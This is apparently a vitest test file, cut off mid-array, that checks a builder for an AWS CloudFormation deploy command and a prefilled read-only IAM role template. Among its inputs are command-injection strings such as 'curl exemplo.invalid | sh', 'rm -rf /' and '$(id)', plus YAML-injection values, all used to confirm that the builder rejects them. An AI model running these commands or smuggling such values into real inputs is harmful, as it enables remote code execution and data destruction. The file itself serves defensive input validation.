import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { cloudAccountSchema } from './cloud-accounts.js';
import {
  AWS_BUCKET_ERROR_CODES,
  AWS_CONNECTION_ERROR_CODES,
  AWS_CONNECTION_WARNING_CODES,
  AWS_LOG_GROUP_TAG,
  AWS_READER_AUDIENCE,
  AWS_READER_AUTHORIZATIONS,
  AWS_READER_CAPABILITIES,
  AWS_READER_CAPABILITIES_SEPARATOR,
  AWS_READER_CAPABILITY_PARAMETERS,
  AWS_READER_PREFILLED_PARAMETERS,
  AWS_READER_ROLE_TAGS,
  AWS_READER_TEMPLATE_FILE,
  AWS_READER_TEMPLATE_VERSION,
  type AwsReaderCapability,
  AwsReaderPrefillError,
  type AwsReaderPrefillProblem,
  type AwsReaderStackValues,
  awsConnectionErrorValue,
  awsLogBucketArns,
  awsReaderCapabilitiesTagValue,
  awsReaderDeployCommand,
  awsReaderPrefilledFileName,
  awsReaderRoleArn,
  CLOUDFORMATION_TEMPLATE_BODY_MAX_BYTES,
  cloudFormationConsoleUrl,
  cloudFormationStacksUrl,
  isAwsConnectionErrorCode,
  isAwsConnectionWarningCode,
  isAwsReaderCapability,
  isNodeEgressIp,
  isNodeServiceAccountId,
  isWebIdentityAudience,
  NODE_EGRESS_IPS_PLACEHOLDER,
  NODE_SERVICE_ACCOUNT_ID_PLACEHOLDER,
  parseAwsConnectionError,
  parseReaderRoleTags,
  prefillReaderTemplate,
} from './aws-reader.js';

// Valores fictícios: conta de documentação da AWS, ID de conta de serviço inventado e IPs de documentação (RFC 5737).
const ACCOUNT = '111122223333';
const SERVICE_ACCOUNT = '123456789012345678901';

describe('papel de leitura sem chave (PR-V3)', () => {
  it('o ARN do papel é derivado da conta: caminho /verax/ e nome fixos, como a saída RoleArn da pilha', () => {
    expect(awsReaderRoleArn(ACCOUNT)).toBe('arn:aws:iam::111122223333:role/verax/verax-control-reader');
  });

  it('o audience padrão é o do template (e passa na própria regra)', () => {
    expect(AWS_READER_AUDIENCE).toBe('https://control.veraxsistemas.com.br/aws-reader');
    expect(isWebIdentityAudience(AWS_READER_AUDIENCE)).toBe(true);
  });

  it.each([
    'https://control.veraxsistemas.com.br/aws-reader',
    'https://aws.verax.example',
    'https://aws.verax.example/a/B_c-1.2',
  ])('audience aceito: %s', (value) => {
    expect(isWebIdentityAudience(value)).toBe(true);
  });

  it.each([
    ['http, sem TLS', 'http://control.veraxsistemas.com.br/aws-reader'],
    ['host com maiúscula', 'https://Control.veraxsistemas.com.br/aws-reader'],
    ['porta', 'https://control.veraxsistemas.com.br:443/aws-reader'],
    ['consulta', 'https://control.veraxsistemas.com.br/aws-reader?x=1'],
    ['fragmento', 'https://control.veraxsistemas.com.br/aws-reader#x'],
    ['curinga', 'https://control.veraxsistemas.com.br/*'],
    ['barra no fim (segmento vazio)', 'https://control.veraxsistemas.com.br/aws-reader/'],
    ['usuário', 'https://user@control.veraxsistemas.com.br/aws-reader'],
    ['espaço', 'https://control.veraxsistemas.com.br/aws reader'],
    ['quebra de linha', 'https://control.veraxsistemas.com.br/aws-reader\n'],
    ['sem host', 'https:///aws-reader'],
    ['vazio', ''],
    ['longo demais', `https://a.example/${'b'.repeat(250)}`],
  ])('audience recusado: %s', (_label, value) => {
    expect(isWebIdentityAudience(value)).toBe(false);
  });

  it('ID da conta de serviço: 21 dígitos, nada mais', () => {
    expect(isNodeServiceAccountId(SERVICE_ACCOUNT)).toBe(true);
    for (const value of ['1'.repeat(20), '1'.repeat(22), `${'1'.repeat(20)}a`, ` ${SERVICE_ACCOUNT}`, '']) {
      expect(isNodeServiceAccountId(value)).toBe(false);
    }
  });

  it('IP de saída: IPv4 com /32, sem zero à esquerda nem octeto acima de 255', () => {
    expect(isNodeEgressIp('203.0.113.10/32')).toBe(true);
    expect(isNodeEgressIp('0.0.0.0/32')).toBe(true);
    for (const value of [
      '203.0.113.10',
      '203.0.113.10/24',
      '203.0.113.256/32',
      '203.0.113.010/32',
      '203.0.113/32',
      '203.0.113.10/32/32',
      '203.0.113.-1/32',
      ' 203.0.113.10/32',
    ]) {
      expect(isNodeEgressIp(value)).toBe(false);
    }
  });

  it('os códigos de erro da conexão são os do worker, e um código desconhecido não é tratado como um deles', () => {
    expect(AWS_CONNECTION_ERROR_CODES).toContain('trust_denied');
    expect(AWS_CONNECTION_ERROR_CODES).toContain('check_unavailable');
    expect(isAwsConnectionErrorCode('region_disabled')).toBe(true);
    expect(isAwsConnectionErrorCode('AccessDenied')).toBe(false);
  });

  it('PR-V5: os códigos da conferência real, e os avisos (a conta continua conectada) são códigos dela', () => {
    for (const code of [
      'trail_not_logging',
      'guardduty_export_missing',
      'excess_permissions',
      'metadata_unavailable',
    ]) {
      expect(isAwsConnectionErrorCode(code)).toBe(true);
    }
    for (const code of AWS_CONNECTION_WARNING_CODES) expect(isAwsConnectionErrorCode(code)).toBe(true);
    expect(AWS_CONNECTION_WARNING_CODES[0]).toBe('region_disabled');
    expect(isAwsConnectionWarningCode('excess_permissions')).toBe(true);
    expect(isAwsConnectionWarningCode('trust_denied')).toBe(false);
    expect(isAwsConnectionWarningCode(null)).toBe(false);
    expect(isAwsConnectionWarningCode('toString')).toBe(false);
  });

  it('erro de bucket com a fonte: gravado como código:fonte, lido de volta, e cabe no connectionError da conta', () => {
    expect(awsConnectionErrorValue('bucket_denied', 'cloudtrail')).toBe('bucket_denied:cloudtrail');
    expect(awsConnectionErrorValue('kms_denied', 'guardduty')).toBe('kms_denied:guardduty');
    // Só os erros de bucket levam a fonte.
    expect(awsConnectionErrorValue('trust_denied', 'waf')).toBe('trust_denied');
    expect(awsConnectionErrorValue('bucket_missing')).toBe('bucket_missing');
    for (const code of AWS_BUCKET_ERROR_CODES) {
      for (const source of ['cloudtrail', 'guardduty', 'waf'] as const) {
        const value = awsConnectionErrorValue(code, source);
        expect(parseAwsConnectionError(value)).toEqual({ code, source });
        expect(cloudAccountSchema.shape.connectionError.safeParse(value).success).toBe(true);
      }
    }
    expect(parseAwsConnectionError('bucket_denied')).toEqual({ code: 'bucket_denied', source: null });
    expect(parseAwsConnectionError('excess_permissions')).toEqual({
      code: 'excess_permissions',
      source: null,
    });
    for (const value of [
      'bucket_denied:outra',
      'trust_denied:waf',
      'bucket_denied:waf:extra',
      'AccessDenied',
      'credential_rejected',
      ':waf',
      '',
    ]) {
      expect(parseAwsConnectionError(value)).toBeNull();
    }
  });

  it('LogBucketArns: um ARN por bucket cadastrado, sem repetir', () => {
    expect(awsLogBucketArns(['trilha-111122223333', 'aws-waf-logs-loja', 'trilha-111122223333'])).toEqual([
      'arn:aws:s3:::trilha-111122223333',
      'arn:aws:s3:::aws-waf-logs-loja',
    ]);
  });

  it('o comando da CLI leva os três valores do nó, as três autorizações e os buckets da conta, como o README', () => {
    expect(
      awsReaderDeployCommand({
        nodeServiceAccountId: SERVICE_ACCOUNT,
        egressIps: ['203.0.113.10/32', '198.51.100.7/32'],
        audience: AWS_READER_AUDIENCE,
        buckets: ['trilha-111122223333', 'guardduty-111122223333'],
      }),
    ).toBe(
      [
        'aws cloudformation deploy --stack-name verax-control-reader \\',
        '  --template-file verax-control-reader.yaml --capabilities CAPABILITY_NAMED_IAM \\',
        '  --parameter-overrides \\',
        '    NodeServiceAccountId=123456789012345678901 \\',
        '    NodeEgressIps=203.0.113.10/32,198.51.100.7/32 \\',
        '    Audience=https://control.veraxsistemas.com.br/aws-reader \\',
        '    ReadAwsServiceLogs=true \\',
        '    ReadSecurityFindings=true \\',
        '    ReadTaggedLogGroups=true \\',
        '    LogBucketArns=arn:aws:s3:::trilha-111122223333,arn:aws:s3:::guardduty-111122223333',
      ].join('\n'),
    );
  });

  it('o comando leva sempre as três autorizações, com true ou false: rodar de novo tira a que foi desligada', () => {
    const command = (capabilities?: readonly AwsReaderCapability[]) =>
      awsReaderDeployCommand({
        nodeServiceAccountId: SERVICE_ACCOUNT,
        egressIps: ['203.0.113.10/32'],
        audience: AWS_READER_AUDIENCE,
        buckets: [],
        ...(capabilities !== undefined && { capabilities }),
      })
        .split('\n')
        .slice(6, 9);
    const all = [
      '    ReadAwsServiceLogs=true \\',
      '    ReadSecurityFindings=true \\',
      '    ReadTaggedLogGroups=true \\',
    ];
    expect(command()).toEqual(all);
    expect(command(['discovery', 'service-logs', 'findings', 'log-groups'])).toEqual(all);
    expect(command(['discovery', 'findings'])).toEqual([
      '    ReadAwsServiceLogs=false \\',
      '    ReadSecurityFindings=true \\',
      '    ReadTaggedLogGroups=false \\',
    ]);
    expect(command([])).toEqual([
      '    ReadAwsServiceLogs=false \\',
      '    ReadSecurityFindings=false \\',
      '    ReadTaggedLogGroups=false \\',
    ]);
    // Um texto qualquer na lista não entra no comando: só os nomes conhecidos contam.
    const hostile = command(['log-groups', 'x; curl exemplo.invalid | sh' as AwsReaderCapability]);
    expect(hostile).toEqual([
      '    ReadAwsServiceLogs=false \\',
      '    ReadSecurityFindings=false \\',
      '    ReadTaggedLogGroups=true \\',
    ]);
  });

  it('sem os valores do nó, ou com um fora do formato, o comando leva o marcador, nunca o texto recebido', () => {
    const command = awsReaderDeployCommand({
      nodeServiceAccountId: null,
      egressIps: [],
      audience: AWS_READER_AUDIENCE,
      buckets: [],
    });
    expect(command).toContain(`NodeServiceAccountId=${NODE_SERVICE_ACCOUNT_ID_PLACEHOLDER} \\`);
    expect(command).toContain(`NodeEgressIps=${NODE_EGRESS_IPS_PLACEHOLDER} \\`);
    expect(command).toContain(`Audience=${AWS_READER_AUDIENCE} \\`);
    // Sem bucket, o LogBucketArns vai vazio: o mesmo comando, numa pilha que já existe, tira os buckets antigos.
    expect(command.endsWith('LogBucketArns=""')).toBe(true);

    const hostile = awsReaderDeployCommand({
      nodeServiceAccountId: '1; curl exemplo.invalid | sh',
      egressIps: ['203.0.113.10/32 $(id)'],
      audience: 'https://x.example/$(id)',
      buckets: ['bucket; rm -rf /', 'trilha-ok'],
    });
    for (const fragment of ['curl', '$(id)', 'rm -rf', ';', '|']) expect(hostile).not.toContain(fragment);
    expect(hostile).toContain(`Audience=${AWS_READER_AUDIENCE}`);
    expect(hostile).toContain('LogBucketArns=arn:aws:s3:::trilha-ok');
    // Mais IPs do que o template aceita (até 4): nenhum entra.
    expect(
      awsReaderDeployCommand({
        nodeServiceAccountId: SERVICE_ACCOUNT,
        egressIps: Array.from({ length: 5 }, (_, index) => `203.0.113.${index + 1}/32`),
        audience: AWS_READER_AUDIENCE,
        buckets: [],
      }),
    ).toContain(`NodeEgressIps=${NODE_EGRESS_IPS_PLACEHOLDER} \\`);
  });

  it('o comando lê o arquivo que o painel baixa: o preenchido, quando é ele, com os parâmetros ainda no comando', () => {
    const values = {
      nodeServiceAccountId: SERVICE_ACCOUNT,
      egressIps: ['203.0.113.10/32'],
      audience: AWS_READER_AUDIENCE,
      buckets: ['trilha-111122223333'],
      capabilities: ['discovery', 'findings'],
    } as const;
    const plain = awsReaderDeployCommand(values);
    const fileOf = (command: string) => command.split(' --template-file ')[1]?.split(' ')[0];
    // Sem a opção (o console da Verax e a alternativa manual), o arquivo do repositório.
    expect(fileOf(plain)).toBe(AWS_READER_TEMPLATE_FILE);
    expect(awsReaderDeployCommand(values, {})).toBe(plain);
    expect(awsReaderDeployCommand(values, { templateFile: undefined })).toBe(plain);
    expect(awsReaderDeployCommand(values, { templateFile: AWS_READER_TEMPLATE_FILE })).toBe(plain);

    // Com o nome do arquivo preenchido, só o nome do arquivo muda: os parâmetros continuam explícitos, porque numa
    // atualização a AWS manteria os valores anteriores da pilha (os padrões do arquivo só valem numa pilha nova).
    const prefilled = awsReaderDeployCommand(values, { templateFile: awsReaderPrefilledFileName(ACCOUNT) });
    expect(fileOf(prefilled)).toBe('verax-control-reader-111122223333.yaml');
    expect(prefilled).toBe(
      plain.replace(
        '--template-file verax-control-reader.yaml ',
        '--template-file verax-control-reader-111122223333.yaml ',
      ),
    );
    for (const parameter of [
      'NodeServiceAccountId=123456789012345678901',
      'NodeEgressIps=203.0.113.10/32',
      `Audience=${AWS_READER_AUDIENCE}`,
      'ReadAwsServiceLogs=false',
      'ReadSecurityFindings=true',
      'ReadTaggedLogGroups=false',
      'LogBucketArns=arn:aws:s3:::trilha-111122223333',
    ]) {
      expect(prefilled).toContain(`    ${parameter}`);
    }
  });

  it.each([
    '',
    '.yaml',
    'verax-control-reader.yml',
    'verax-control-reader.yaml.sh',
    'Verax-Control-Reader.yaml',
    'verax control reader.yaml',
    '-o.yaml',
    '--template-url.yaml',
    '.oculto.yaml',
    '../verax-control-reader.yaml',
    'pasta/verax-control-reader.yaml',
    'pasta\\verax-control-reader.yaml',
    'a..b.yaml',
    'verax_control_reader.yaml',
    "x'; curl exemplo.invalid | sh #.yaml",
    'x$(id).yaml',
    'x`id`.yaml',
    'x\nrm -rf.yaml',
    `${'a'.repeat(60)}.yaml`,
  ])('nome de arquivo fora do formato não entra no comando: %j', (templateFile) => {
    const values = {
      nodeServiceAccountId: SERVICE_ACCOUNT,
      egressIps: ['203.0.113.10/32'],
      audience: AWS_READER_AUDIENCE,
      buckets: [],
    };
    expect(awsReaderDeployCommand(values, { templateFile })).toBe(awsReaderDeployCommand(values));
  });

  it.each(['modelo.yaml', 'verax-control-reader-000000000000.yaml', '1.yaml', `${'a'.repeat(59)}.yaml`])(
    'nome de arquivo aceito no comando: %s',
    (templateFile) => {
      const command = awsReaderDeployCommand(
        { nodeServiceAccountId: SERVICE_ACCOUNT, egressIps: [], audience: AWS_READER_AUDIENCE, buckets: [] },
        { templateFile },
      );
      expect(command).toContain(`  --template-file ${templateFile} --capabilities CAPABILITY_NAMED_IAM \\`);
    },
  );

  it('o console do CloudFormation abre na região da conta (ou em sa-east-1)', () => {
    expect(cloudFormationConsoleUrl('us-east-1')).toBe(
      'https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks/create',
    );
    expect(cloudFormationConsoleUrl(undefined)).toContain('region=sa-east-1');
    expect(cloudFormationConsoleUrl('marte-1')).toContain('region=sa-east-1');
  });

  it('a lista de pilhas (para atualizar a que já existe) abre na mesma região, sem aceitar texto livre', () => {
    expect(cloudFormationStacksUrl('us-east-1')).toBe(
      'https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks',
    );
    expect(cloudFormationStacksUrl(undefined)).toBe(
      'https://console.aws.amazon.com/cloudformation/home?region=sa-east-1#/stacks',
    );
    // Uma "região" que não é da AWS (ou que tenta levar outro endereço) cai na padrão.
    for (const region of ['marte-1', 'sa-east-1#/stacks/create', 'us-east-1&x=1', '']) {
      expect(cloudFormationStacksUrl(region)).toBe(
        'https://console.aws.amazon.com/cloudformation/home?region=sa-east-1#/stacks',
      );
    }
    // A criação e a lista só diferem no fim do endereço.
    expect(cloudFormationConsoleUrl('eu-west-1')).toBe(`${cloudFormationStacksUrl('eu-west-1')}/create`);
  });
});

describe('modelo 2 do papel de leitura: versão, capacidades e etiquetas', () => {
  it('as constantes são as do template: a versão, as capacidades na ordem da etiqueta e o parâmetro de cada autorização', () => {
    expect(AWS_READER_TEMPLATE_VERSION).toBe(2);
    expect(AWS_READER_CAPABILITIES).toEqual(['discovery', 'service-logs', 'findings', 'log-groups']);
    expect(AWS_READER_AUTHORIZATIONS).toEqual(['service-logs', 'findings', 'log-groups']);
    expect(AWS_READER_CAPABILITY_PARAMETERS).toEqual({
      'service-logs': 'ReadAwsServiceLogs',
      findings: 'ReadSecurityFindings',
      'log-groups': 'ReadTaggedLogGroups',
    });
    expect(AWS_READER_ROLE_TAGS).toEqual({
      template: 'verax-control:template',
      capabilities: 'verax-control:capabilities',
    });
    expect(AWS_LOG_GROUP_TAG).toEqual({ key: 'verax-control', value: 'leitura' });
    expect(isAwsReaderCapability('findings')).toBe(true);
    expect(isAwsReaderCapability('toString')).toBe(false);
    expect(isAwsReaderCapability('Findings')).toBe(false);
  });

  it('o template diz o mesmo: os parâmetros, a etiqueta dos grupos de log e as etiquetas do papel', () => {
    const template = readerTemplate();
    for (const parameter of Object.values(AWS_READER_CAPABILITY_PARAMETERS)) {
      expect(template).toContain(`  ${parameter}:\n    Type: String\n    Description: >-\n`);
    }
    expect(template).toContain(`aws:ResourceTag/${AWS_LOG_GROUP_TAG.key}: ${AWS_LOG_GROUP_TAG.value}\n`);
    expect(template).toContain(
      [
        '      Tags:',
        `        - Key: ${AWS_READER_ROLE_TAGS.template}`,
        `          Value: '${AWS_READER_TEMPLATE_VERSION}'`,
        `        - Key: ${AWS_READER_ROLE_TAGS.capabilities}`,
        '          Value: !Join',
        "            - ''",
        '            - - discovery',
        "              - !If [ReadsServiceLogs, ' service-logs', '']",
        "              - !If [ReadsFindings, ' findings', '']",
        "              - !If [ReadsLogGroups, ' log-groups', '']",
        '',
      ].join('\n'),
    );
  });

  it('o valor da etiqueta: a descoberta sempre, na ordem fixa, separado por espaço (o IAM recusa vírgula)', () => {
    expect(AWS_READER_CAPABILITIES_SEPARATOR).toBe(' ');
    expect(awsReaderCapabilitiesTagValue([...AWS_READER_CAPABILITIES])).toBe(
      'discovery service-logs findings log-groups',
    );
    expect(awsReaderCapabilitiesTagValue(['log-groups', 'findings'])).toBe('discovery findings log-groups');
    expect(awsReaderCapabilitiesTagValue([])).toBe('discovery');
    // O que o IAM aceita no valor de uma etiqueta: letras, números, espaço e _ . : / = + - @.
    for (const capabilities of [[], ['findings'], [...AWS_READER_CAPABILITIES]] as AwsReaderCapability[][]) {
      expect(awsReaderCapabilitiesTagValue(capabilities)).toMatch(/^[A-Za-z0-9 _.:/=+@-]{1,256}$/);
    }
  });

  it('sem a etiqueta do modelo, o papel é do modelo 1: a descoberta de antes e nenhuma autorização', () => {
    const first = { templateVersion: 1, capabilities: ['discovery'] };
    expect(parseReaderRoleTags(undefined)).toEqual(first);
    expect(parseReaderRoleTags(null)).toEqual(first);
    expect(parseReaderRoleTags([])).toEqual(first);
    expect(parseReaderRoleTags([{ Key: 'Projeto', Value: 'loja' }])).toEqual(first);
    // Só a lista, sem a versão: não é o modelo 2.
    expect(parseReaderRoleTags([{ Key: 'verax-control:capabilities', Value: 'discovery findings' }])).toEqual(
      first,
    );
  });

  it('lê as etiquetas que o template grava, em cada combinação das autorizações', () => {
    const subsets: AwsReaderCapability[][] = [
      [],
      ['service-logs'],
      ['findings'],
      ['log-groups'],
      ['service-logs', 'log-groups'],
      ['service-logs', 'findings', 'log-groups'],
    ];
    for (const granted of subsets) {
      const tags = [
        { Key: 'aws:cloudformation:stack-name', Value: 'verax-control-reader' },
        { Key: AWS_READER_ROLE_TAGS.template, Value: String(AWS_READER_TEMPLATE_VERSION) },
        { Key: AWS_READER_ROLE_TAGS.capabilities, Value: awsReaderCapabilitiesTagValue(granted) },
      ];
      expect(parseReaderRoleTags(tags)).toEqual({
        templateVersion: 2,
        capabilities: ['discovery', ...granted],
      });
    }
  });

  it('as etiquetas vêm da conta do cliente: só a versão em número e os nomes conhecidos contam', () => {
    const parse = (template: string, capabilities?: string) =>
      parseReaderRoleTags([
        { Key: 'verax-control:template', Value: template },
        ...(capabilities === undefined ? [] : [{ Key: 'verax-control:capabilities', Value: capabilities }]),
      ]);
    // Um modelo mais novo que este painel: a versão é a da etiqueta, e uma capacidade que ele não conhece é ignorada.
    expect(parse('3', 'discovery findings response')).toEqual({
      templateVersion: 3,
      capabilities: ['discovery', 'findings'],
    });
    // A versão fora do formato: null, e as capacidades continuam lidas.
    for (const version of ['', '0', '02', '2.0', 'v2', '-2', '2 ; rm -rf /', '99999', '２']) {
      expect(parse(version, 'discovery log-groups')).toEqual({
        templateVersion: null,
        capabilities: ['discovery', 'log-groups'],
      });
    }
    expect(parse(' 2 ', 'discovery')).toEqual({ templateVersion: 2, capabilities: ['discovery'] });
    // Sem a lista, só a descoberta; a descoberta entra mesmo se a lista não a traz.
    expect(parse('2')).toEqual({ templateVersion: 2, capabilities: ['discovery'] });
    expect(parse('2', '')).toEqual({ templateVersion: 2, capabilities: ['discovery'] });
    expect(parse('2', 'findings')).toEqual({ templateVersion: 2, capabilities: ['discovery', 'findings'] });
    // Repetida, fora de ordem, com outros separadores e com texto estranho: só os nomes exatos, na ordem fixa.
    expect(parse('2', 'log-groups,findings  findings\tservice-logs\nFINDINGS x<script> __proto__')).toEqual({
      templateVersion: 2,
      capabilities: ['discovery', 'service-logs', 'findings', 'log-groups'],
    });
    expect(parse('2', 'service-logsfindings discovery-all')).toEqual({
      templateVersion: 2,
      capabilities: ['discovery'],
    });
    // A chave da etiqueta de um papel não distingue maiúsculas no IAM; etiqueta sem chave ou sem valor não conta.
    expect(
      parseReaderRoleTags([
        { Key: 'Verax-Control:Template', Value: '2' },
        { Key: 'VERAX-CONTROL:CAPABILITIES', Value: 'discovery findings' },
        { Key: undefined, Value: 'x' },
        { Key: 'verax-control:capabilities' },
      ]),
    ).toEqual({ templateVersion: 2, capabilities: ['discovery', 'findings'] });
    // Um valor maior do que o IAM aceita numa etiqueta não é lido.
    expect(parse('2', `findings ${'x'.repeat(300)}`)).toEqual({
      templateVersion: 2,
      capabilities: ['discovery'],
    });
  });
});

/** O template do repositório, como o painel o serve (o mesmo arquivo, byte a byte). */
function readerTemplate(): string {
  return readFileSync(
    new URL('../../../infra/cloudformation/verax-control-reader.yaml', import.meta.url),
    'utf8',
  );
}

/** O padrão (`Default:`) de cada parâmetro do template, como está escrito na linha; ausente quando não há. */
function parameterDefaults(template: string): Map<string, string | undefined> {
  const defaults = new Map<string, string | undefined>();
  let inParameters = false;
  let current: string | null = null;
  for (const raw of template.split('\n')) {
    const line = raw.replace(/\r$/, '');
    if (/^\S/.test(line) && !line.startsWith('#')) {
      inParameters = line === 'Parameters:';
      current = null;
      continue;
    }
    if (!inParameters) continue;
    const header = /^ {2}(\w+):$/.exec(line);
    if (header?.[1] !== undefined) {
      current = header[1];
      defaults.set(current, undefined);
    } else if (current !== null && line.startsWith('    Default: ')) {
      defaults.set(current, line.slice('    Default: '.length));
    }
  }
  return defaults;
}

/**
 * As linhas que mudam do template para o arquivo preenchido: as trocadas (na mesma posição) e as acrescentadas (com
 * a linha de antes delas). Todas as outras são iguais e estão na mesma ordem, ou o teste falha aqui.
 */
function lineChanges(original: string, filled: string) {
  const before = original.split('\n');
  const after = filled.split('\n');
  const replaced: { from: string; to: string }[] = [];
  const added: { after: string; line: string }[] = [];
  let position = 0;
  after.forEach((line, index) => {
    if (line === before[position]) {
      position += 1;
    } else if (after[index + 1] === before[position]) {
      added.push({ after: after[index - 1] ?? '', line });
    } else {
      replaced.push({ from: before[position] ?? '', to: line });
      position += 1;
    }
  });
  expect(position).toBe(before.length);
  expect(after.length).toBe(before.length + added.length);
  return { replaced, added };
}

describe('template preenchido do botão "Conectar com AWS"', () => {
  const template = readerTemplate();
  const values: AwsReaderStackValues = {
    nodeServiceAccountId: SERVICE_ACCOUNT,
    egressIps: ['203.0.113.10/32', '198.51.100.7/32'],
    audience: AWS_READER_AUDIENCE,
    buckets: [],
  };
  const problemOf = (run: () => unknown): AwsReaderPrefillProblem | 'sem erro' => {
    try {
      run();
    } catch (error) {
      if (error instanceof AwsReaderPrefillError) return error.problem;
      throw error;
    }
    return 'sem erro';
  };

  it('os parâmetros que o preenchimento toca existem no template, e são só estes sete', () => {
    expect(AWS_READER_PREFILLED_PARAMETERS).toEqual([
      'NodeServiceAccountId',
      'NodeEgressIps',
      'Audience',
      'ReadAwsServiceLogs',
      'ReadSecurityFindings',
      'ReadTaggedLogGroups',
      'LogBucketArns',
    ]);
    const defaults = parameterDefaults(template);
    for (const parameter of AWS_READER_PREFILLED_PARAMETERS) expect(defaults.has(parameter)).toBe(true);
    // O template, sem preencher: quem entra no papel não tem padrão, e as três autorizações vêm ligadas.
    expect(defaults.get('NodeServiceAccountId')).toBeUndefined();
    expect(defaults.get('NodeEgressIps')).toBeUndefined();
    expect(defaults.get('Audience')).toBe(AWS_READER_AUDIENCE);
    for (const parameter of Object.values(AWS_READER_CAPABILITY_PARAMETERS)) {
      expect(defaults.get(parameter)).toBe("'true'");
    }
    expect(defaults.get('LogBucketArns')).toBe("''");
  });

  it('só mudam as linhas Default dos parâmetros do nó: duas entram, a do audience é trocada, e o resto fica igual', () => {
    const filled = prefillReaderTemplate(template, values);
    expect(lineChanges(template, filled)).toEqual({
      added: [
        { after: '    Type: String', line: "    Default: '123456789012345678901'" },
        { after: '    Type: String', line: "    Default: '203.0.113.10/32,198.51.100.7/32'" },
      ],
      replaced: [
        {
          from: '    Default: https://control.veraxsistemas.com.br/aws-reader',
          to: "    Default: 'https://control.veraxsistemas.com.br/aws-reader'",
        },
      ],
    });
    // Cada valor no parâmetro dele; todo outro parâmetro com o padrão do template.
    const before = parameterDefaults(template);
    const after = parameterDefaults(filled);
    expect([...after.keys()]).toEqual([...before.keys()]);
    expect(after.get('NodeServiceAccountId')).toBe("'123456789012345678901'");
    expect(after.get('NodeEgressIps')).toBe("'203.0.113.10/32,198.51.100.7/32'");
    expect(after.get('Audience')).toBe(`'${AWS_READER_AUDIENCE}'`);
    for (const [parameter, value] of before) {
      if (!['NodeServiceAccountId', 'NodeEgressIps', 'Audience'].includes(parameter)) {
        expect(after.get(parameter)).toBe(value);
      }
    }
    // O ID da conta de serviço vai entre aspas: sem elas, o YAML o leria como número e perderia dígitos.
    expect(filled).toContain(
      "  NodeServiceAccountId:\n    Type: String\n    Default: '123456789012345678901'\n",
    );
    // Nada fora da seção dos parâmetros muda: os recursos e as saídas são os do template.
    expect(filled.slice(filled.indexOf('\nRules:\n'))).toBe(template.slice(template.indexOf('\nRules:\n')));
    // Preencher de novo o arquivo já preenchido dá o mesmo arquivo.
    expect(prefillReaderTemplate(filled, values)).toBe(filled);
  });

  it('as autorizações vão como true ou false, cada uma no parâmetro dela', () => {
    const flags = (capabilities?: readonly AwsReaderCapability[]) => {
      const filled = prefillReaderTemplate(template, {
        ...values,
        ...(capabilities !== undefined && { capabilities }),
      });
      const defaults = parameterDefaults(filled);
      return AWS_READER_AUTHORIZATIONS.map((capability) =>
        defaults.get(AWS_READER_CAPABILITY_PARAMETERS[capability]),
      );
    };
    expect(flags()).toEqual(["'true'", "'true'", "'true'"]);
    expect(flags([...AWS_READER_CAPABILITIES])).toEqual(["'true'", "'true'", "'true'"]);
    expect(flags(['discovery'])).toEqual(["'false'", "'false'", "'false'"]);
    expect(flags([])).toEqual(["'false'", "'false'", "'false'"]);
    expect(flags(['findings'])).toEqual(["'false'", "'true'", "'false'"]);
    expect(flags(['service-logs', 'log-groups'])).toEqual(["'true'", "'false'", "'true'"]);
    // Desligar uma autorização troca só a linha dela (além das do nó).
    const { replaced, added } = lineChanges(
      template,
      prefillReaderTemplate(template, { ...values, capabilities: ['service-logs', 'findings'] }),
    );
    expect(added).toHaveLength(2);
    expect(replaced.map((change) => change.to)).toEqual([
      `    Default: '${AWS_READER_AUDIENCE}'`,
      "    Default: 'false'",
    ]);
    expect(replaced[1]?.from).toBe("    Default: 'true'");
  });

  it('os buckets cadastrados só entram quando a conta os tem', () => {
    expect(parameterDefaults(prefillReaderTemplate(template, values)).get('LogBucketArns')).toBe("''");
    const filled = prefillReaderTemplate(template, {
      ...values,
      buckets: ['trilha-111122223333', 'aws-waf-logs-loja', 'trilha-111122223333'],
    });
    expect(parameterDefaults(filled).get('LogBucketArns')).toBe(
      "'arn:aws:s3:::trilha-111122223333,arn:aws:s3:::aws-waf-logs-loja'",
    );
    const { replaced, added } = lineChanges(template, filled);
    expect(added).toHaveLength(2);
    expect(replaced.map((change) => change.from)).toEqual([
      `    Default: ${AWS_READER_AUDIENCE}`,
      "    Default: ''",
    ]);
    // As chaves KMS e os prefixos não são do cadastro: ficam como no template.
    expect(parameterDefaults(filled).get('LogKmsKeyArns')).toBe("''");
    expect(parameterDefaults(filled).get('LogObjectPrefix')).toBe("''");
  });

  it.each<[string, Partial<AwsReaderStackValues>, AwsReaderPrefillProblem]>([
    ['sem o ID da conta de serviço', { nodeServiceAccountId: null }, 'service_account'],
    ['ID com 20 dígitos', { nodeServiceAccountId: '1'.repeat(20) }, 'service_account'],
    ['ID com uma letra', { nodeServiceAccountId: `${'1'.repeat(20)}a` }, 'service_account'],
    [
      'ID com uma quebra de linha e outra chave',
      { nodeServiceAccountId: `${SERVICE_ACCOUNT}\n    NoEcho: true` },
      'service_account',
    ],
    ['ID com aspas', { nodeServiceAccountId: `${SERVICE_ACCOUNT.slice(0, 20)}'` }, 'service_account'],
    ['sem IP de saída', { egressIps: [] }, 'egress_ips'],
    ['IP sem /32', { egressIps: ['203.0.113.10'] }, 'egress_ips'],
    ['uma faixa no lugar do IP', { egressIps: ['0.0.0.0/0'] }, 'egress_ips'],
    [
      'cinco IPs',
      {
        egressIps: ['203.0.113.1/32', '203.0.113.2/32', '203.0.113.3/32', '203.0.113.4/32', '203.0.113.5/32'],
      },
      'egress_ips',
    ],
    ['IP com um comentário do YAML', { egressIps: ['203.0.113.10/32 # x'] }, 'egress_ips'],
    ['IP com uma quebra de linha', { egressIps: ['203.0.113.10/32\n'] }, 'egress_ips'],
    ['audience sem TLS', { audience: 'http://control.veraxsistemas.com.br/aws-reader' }, 'audience'],
    ['audience com curinga', { audience: 'https://control.veraxsistemas.com.br/*' }, 'audience'],
    ['audience com aspas e outra chave', { audience: "https://a.example/x'\nResources: {}" }, 'audience'],
    [
      'audience com uma função do CloudFormation',
      { audience: 'https://a.example/${AWS::AccountId}' },
      'audience',
    ],
    ['audience vazio', { audience: '' }, 'audience'],
    [
      'autorização desconhecida',
      { capabilities: ['findings', 'admin' as AwsReaderCapability] },
      'capabilities',
    ],
    [
      'autorização com texto do YAML',
      { capabilities: ["true'\n    Default: 'true" as AwsReaderCapability] },
      'capabilities',
    ],
